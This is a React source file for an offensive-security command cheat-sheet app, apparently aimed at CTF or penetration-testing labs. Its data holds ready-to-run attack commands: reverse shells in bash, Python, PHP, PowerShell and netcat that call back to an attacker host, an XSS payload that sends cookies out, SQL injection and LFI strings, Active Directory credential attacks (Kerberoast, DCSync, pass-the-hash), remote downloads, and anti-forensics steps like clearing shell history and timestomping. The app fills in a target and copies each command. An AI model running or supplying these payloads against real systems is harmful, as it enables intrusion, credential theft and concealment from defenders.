import React, { useState, useMemo } from 'react';
import { motion } from 'framer-motion';
import { Terminal, Search, Copy, Check, Star, Filter, Globe, Key, Shield, Server, Database, Lock, Users, Eye, Crosshair } from 'lucide-react';

const CommandReference = () => {
    const [activeCategory, setActiveCategory] = useState('recon');
    const [searchQuery, setSearchQuery] = useState('');
    const [copiedCmd, setCopiedCmd] = useState(null);
    const [favorites, setFavorites] = useState(() => {
        const saved = localStorage.getItem('cmd_favorites');
        return saved ? JSON.parse(saved) : [];
    });
    const [params, setParams] = useState({ TARGET: '10.10.10.10', LHOST: '10.10.14.1', LPORT: '4444', USER: 'admin', PASS: 'password' });

    const categories = [
        {
            id: 'recon', name: 'Reconnaissance', icon: Search, commands: [
                { name: 'Nmap Full Scan', cmd: 'nmap -sC -sV -p- -oA full TARGET', tags: ['nmap', 'ports'], desc: 'Complete port scan with scripts' },
                { name: 'Nmap UDP', cmd: 'nmap -sU --top-ports 100 TARGET', tags: ['nmap', 'udp'], desc: 'UDP port scan' },
                { name: 'Gobuster Dir', cmd: 'gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt', tags: ['gobuster', 'web'], desc: 'Directory brute force' },
                { name: 'FFuf Vhost', cmd: 'ffuf -u http://TARGET -H "Host: FUZZ.TARGET" -w subdomains.txt', tags: ['ffuf', 'vhost'], desc: 'Virtual host enumeration' },
                { name: 'Nikto', cmd: 'nikto -h http://TARGET', tags: ['nikto', 'web'], desc: 'Web vulnerability scanner' },
            ]
        },
        {
            id: 'web', name: 'Web Attacks', icon: Globe, commands: [
                { name: 'SQLi Auth Bypass', cmd: "' OR '1'='1", tags: ['sqli', 'auth'], desc: 'Basic authentication bypass' },
                { name: 'SQLi UNION', cmd: "' UNION SELECT 1,2,3,4,5--", tags: ['sqli', 'union'], desc: 'UNION injection test' },
                { name: 'XSS Basic', cmd: '<script>alert(1)</script>', tags: ['xss', 'basic'], desc: 'Basic XSS payload' },
                { name: 'XSS Cookie Steal', cmd: '<script>document.location="http://LHOST/?c="+document.cookie</script>', tags: ['xss', 'cookie'], desc: 'Cookie exfiltration' },
                { name: 'LFI Basic', cmd: '../../../etc/passwd', tags: ['lfi'], desc: 'Local File Inclusion' },
                { name: 'LFI PHP Wrapper', cmd: 'php://filter/convert.base64-encode/resource=index.php', tags: ['lfi', 'php'], desc: 'PHP wrapper for source code' },
            ]
        },
        {
            id: 'shells', name: 'Reverse Shells', icon: Terminal, commands: [
                { name: 'Bash TCP', cmd: 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1', tags: ['bash', 'tcp'], desc: 'Bash reverse shell' },
                { name: 'Python', cmd: 'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'', tags: ['python'], desc: 'Python reverse shell' },
                { name: 'PHP', cmd: 'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'', tags: ['php'], desc: 'PHP reverse shell' },
                { name: 'PowerShell', cmd: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'LHOST\',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"', tags: ['powershell', 'windows'], desc: 'PowerShell reverse shell' },
                { name: 'Netcat', cmd: 'nc -e /bin/sh LHOST LPORT', tags: ['nc', 'netcat'], desc: 'Netcat reverse shell' },
            ]
        },
        {
            id: 'privesc', name: 'Privilege Escalation', icon: Shield, commands: [
                { name: 'LinPEAS', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', tags: ['linpeas', 'linux'], desc: 'Linux privilege escalation' },
                { name: 'WinPEAS', cmd: 'winPEASany.exe', tags: ['winpeas', 'windows'], desc: 'Windows privilege escalation' },
                { name: 'SUID Find', cmd: 'find / -perm -4000 2>/dev/null', tags: ['suid', 'linux'], desc: 'Find SUID binaries' },
                { name: 'Sudo -l', cmd: 'sudo -l', tags: ['sudo', 'linux'], desc: 'Check sudo permissions' },
            ]
        },
        {
            id: 'ad', name: 'Active Directory', icon: Users, commands: [
                { name: 'BloodHound Collect', cmd: 'SharpHound.exe -c all', tags: ['bloodhound', 'sharphound'], desc: 'Collect AD data' },
                { name: 'Kerberoast', cmd: 'GetUserSPNs.py DOMAIN/USER:PASS -dc-ip TARGET -request', tags: ['kerberoast'], desc: 'Kerberoasting attack' },
                { name: 'ASREPRoast', cmd: 'GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip TARGET', tags: ['asreproast'], desc: 'AS-REP Roasting' },
                { name: 'DCSync', cmd: 'secretsdump.py DOMAIN/USER:PASS@TARGET', tags: ['dcsync', 'mimikatz'], desc: 'DCSync attack' },
                { name: 'Pass-the-Hash', cmd: 'psexec.py -hashes :HASH DOMAIN/USER@TARGET', tags: ['pth'], desc: 'Pass-the-Hash' },
            ]
        },
        {
            id: 'transfer', name: 'File Transfer', icon: Server, commands: [
                { name: 'Python HTTP', cmd: 'python3 -m http.server 80', tags: ['python', 'http'], desc: 'Python HTTP server' },
                { name: 'Wget', cmd: 'wget http://LHOST/file', tags: ['wget'], desc: 'Download file with wget' },
                { name: 'Curl', cmd: 'curl http://LHOST/file -o file', tags: ['curl'], desc: 'Download file with curl' },
                { name: 'PowerShell Download', cmd: 'Invoke-WebRequest -Uri http://LHOST/file -OutFile file', tags: ['powershell', 'windows'], desc: 'PowerShell download' },
                { name: 'Certutil', cmd: 'certutil -urlcache -f http://LHOST/file file', tags: ['certutil', 'windows'], desc: 'Windows certutil download' },
            ]
        },
        {
            id: 'crack', name: 'Password Cracking', icon: Key, commands: [
                { name: 'John Basic', cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt', tags: ['john'], desc: 'John the Ripper' },
                { name: 'Hashcat MD5', cmd: 'hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt', tags: ['hashcat', 'md5'], desc: 'Hashcat MD5' },
                { name: 'Hashcat NTLM', cmd: 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt', tags: ['hashcat', 'ntlm'], desc: 'Hashcat NTLM' },
                { name: 'Hydra SSH', cmd: 'hydra -l USER -P /usr/share/wordlists/rockyou.txt TARGET ssh', tags: ['hydra', 'ssh'], desc: 'Hydra SSH brute force' },
            ]
        },
        {
            id: 'evasion', name: 'Evasion & OPSEC', icon: Eye, commands: [
                { name: 'Clear History', cmd: 'history -c && rm ~/.bash_history', tags: ['linux', 'logs'], desc: 'Clear bash history' },
                { name: 'Timestomp', cmd: 'touch -r /etc/passwd malware.exe', tags: ['timestomp'], desc: 'Change file timestamps' },
                { name: 'Process Hollow', cmd: 'Process injection technique', tags: ['evasion'], desc: 'Process hollowing' },
            ]
        },
    ];

    const replaceParams = (cmd) => {
        let result = cmd;
        Object.entries(params).forEach(([key, value]) => { result = result.replace(new RegExp(key, 'g'), value); });
        return result;
    };

    const copyToClipboard = (cmd, id) => {
        navigator.clipboard.writeText(replaceParams(cmd));
        setCopiedCmd(id);
        setTimeout(() => setCopiedCmd(null), 2000);
    };

    const toggleFavorite = (id) => {
        const updated = favorites.includes(id) ? favorites.filter(f => f !== id) : [...favorites, id];
        setFavorites(updated);
        localStorage.setItem('cmd_favorites', JSON.stringify(updated));
    };

    const currentCategory = categories.find(c => c.id === activeCategory);
    const filteredCommands = useMemo(() => {
        if (!currentCategory) return [];
        return currentCategory.commands.filter(cmd =>
            cmd.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
            cmd.tags.some(t => t.toLowerCase().includes(searchQuery.toLowerCase())) ||
            cmd.desc.toLowerCase().includes(searchQuery.toLowerCase())
        );
    }, [currentCategory, searchQuery]);

    return (
        <div style={{ minHeight: '100vh', background: 'linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%)', color: '#e0e0e0', padding: 24, fontFamily: 'Rajdhani, sans-serif' }}>
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} style={{ marginBottom: 24 }}>
                <h1 style={{ display: 'flex', alignItems: 'center', gap: 12, fontSize: '1.8rem', color: '#fff', margin: 0 }}>
                    <Terminal size={32} /> Command <span style={{ background: 'linear-gradient(135deg, #00ff88, #00d4ff)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>Reference</span>
                    <span style={{ background: 'linear-gradient(135deg, #e74c3c, #c0392b)', fontSize: '0.6rem', padding: '3px 8px', borderRadius: 4, color: '#fff' }}>PRO</span>
                </h1>
            </motion.div>

            {/* Parameter Bar */}
            <div style={{ display: 'flex', gap: 12, marginBottom: 24, flexWrap: 'wrap', padding: 16, background: 'rgba(0,0,0,0.3)', borderRadius: 12 }}>
                {Object.entries(params).map(([key, value]) => (
                    <div key={key} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                        <label style={{ color: '#888', fontSize: '0.85rem' }}>{key}:</label>
                        <input value={value} onChange={(e) => setParams({ ...params, [key]: e.target.value })} style={{ background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 6, padding: '6px 10px', color: '#00ff88', width: 120, fontFamily: 'JetBrains Mono, monospace', fontSize: '0.85rem' }} />
                    </div>
                ))}
            </div>

            {/* Search */}
            <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 24, padding: '12px 16px', background: 'rgba(0,0,0,0.3)', borderRadius: 10 }}>
                <Search size={20} color="#888" />
                <input placeholder="Search commands, tags..." value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} style={{ flex: 1, background: 'transparent', border: 'none', color: '#fff', fontSize: '1rem', outline: 'none' }} />
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '200px 1fr', gap: 24 }}>
                {/* Sidebar */}
                <div style={{ background: 'rgba(0,0,0,0.3)', borderRadius: 12, padding: 12 }}>
                    {categories.map(cat => (
                        <button key={cat.id} onClick={() => setActiveCategory(cat.id)} style={{ display: 'flex', alignItems: 'center', gap: 10, width: '100%', padding: 12, background: activeCategory === cat.id ? 'rgba(0,255,136,0.2)' : 'transparent', border: 'none', borderRadius: 8, color: activeCategory === cat.id ? '#00ff88' : '#888', cursor: 'pointer', textAlign: 'left', marginBottom: 4 }}>
                            <cat.icon size={18} /> {cat.name}
                        </button>
                    ))}
                </div>

                {/* Commands */}
                <div style={{ display: 'grid', gap: 12 }}>
                    {filteredCommands.map((cmd, i) => {
                        const cmdId = `${activeCategory}-${i}`;
                        return (
                            <motion.div key={i} initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.03 }} style={{ background: 'rgba(0,0,0,0.3)', border: '1px solid rgba(255,255,255,0.05)', borderRadius: 12, padding: 16 }}>
                                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
                                    <span style={{ fontWeight: 600, color: '#fff' }}>{cmd.name}</span>
                                    <button onClick={() => toggleFavorite(cmdId)} style={{ background: 'transparent', border: 'none', cursor: 'pointer', padding: 4 }}>
                                        <Star size={18} fill={favorites.includes(cmdId) ? '#f39c12' : 'none'} color={favorites.includes(cmdId) ? '#f39c12' : '#555'} />
                                    </button>
                                </div>
                                <div style={{ fontSize: '0.85rem', color: '#888', marginBottom: 8 }}>{cmd.desc}</div>
                                <div style={{ display: 'flex', gap: 6, marginBottom: 12 }}>{cmd.tags.map(t => <span key={t} style={{ background: 'rgba(0,255,136,0.15)', color: '#00ff88', padding: '2px 8px', borderRadius: 4, fontSize: '0.75rem' }}>{t}</span>)}</div>
                                <div style={{ display: 'flex', alignItems: 'center', gap: 12, background: '#0a0a0f', borderRadius: 8, padding: 12 }}>
                                    <code style={{ flex: 1, color: '#00ff88', wordBreak: 'break-all', fontSize: '0.85rem' }}>{replaceParams(cmd.cmd)}</code>
                                    <button onClick={() => copyToClipboard(cmd.cmd, cmdId)} style={{ background: copiedCmd === cmdId ? 'rgba(0,255,136,0.2)' : 'rgba(0,255,136,0.1)', border: 'none', color: '#00ff88', padding: 8, borderRadius: 6, cursor: 'pointer' }}>
                                        {copiedCmd === cmdId ? <Check size={16} /> : <Copy size={16} />}
                                    </button>
                                </div>
                            </motion.div>
                        );
                    })}
                </div>
            </div>
        </div>
    );
};

export default CommandReference;
